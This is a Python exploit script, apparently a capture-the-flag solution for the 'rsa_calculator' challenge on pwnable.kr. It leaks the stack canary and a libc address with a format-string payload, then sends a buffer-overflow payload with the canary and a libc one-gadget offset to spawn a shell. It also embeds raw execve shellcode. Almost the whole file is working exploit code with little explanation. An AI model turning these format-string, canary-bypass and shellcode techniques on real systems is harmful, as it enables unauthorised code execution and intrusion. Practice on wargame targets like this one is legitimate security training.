#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from binaryfang import *
import time
import os
import sys
import random

elf = ""
libc = ""
env = ""
LOCAL = 1
context.log_level = "debug"

#p = process("./rsa_calculator")
p = remote("pwnable.kr", 9012)

p.recvuntil("> ")

#set key
p.sendline("1")
p.recvuntil("p : ")
p.sendline("53")
p.recvuntil("q : ")
p.sendline("61")
p.recvuntil("e : ")
p.sendline("17")
p.recvuntil("d : ")
p.sendline("2753")
p.recvuntil("> ")

#leak canary
p.sendline("2")
p.recvuntil(") : ")
p.sendline("1024")
p.recvuntil("data\n")
p.sendline("%205$lx%211$lx")
data = p.recvuntil("> ")
payload = data.split(") -\n")[1].split("\n")[0]
p.sendline("3")
p.recvuntil(") : ")
p.sendline("1024")
p.recvuntil("data\n")
p.sendline(payload)
data = p.recvuntil("> ")
temp = data.split("result -\n")[1].split("\n")[0]
canary = temp[:16]
libc = temp[16:]

print "[*]canary: " + canary
print "[*]libc: " + libc
canary = int(canary,16)
libc = int(libc,16)
libc_base = libc - 0x20830 
#
p.sendline("2")
p.recvuntil(") : ")
p.sendline("1024")
p.recvuntil("data\n")
p.sendline("afang")
data = p.recvuntil("> ")

#set shellcode
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

jmp_rsp = 0x40149a #old tricks.
pop_rbx = 0x400911 #ppr

payload = "\x00" * 1544 + p64(canary) + "a" * 8 + p64(libc_base + 0x45216)


p.sendline("3")
p.recvuntil(") : ")
p.sendline("-1")
p.recvuntil("data\n")
p.sendline(payload)
p.interactive()



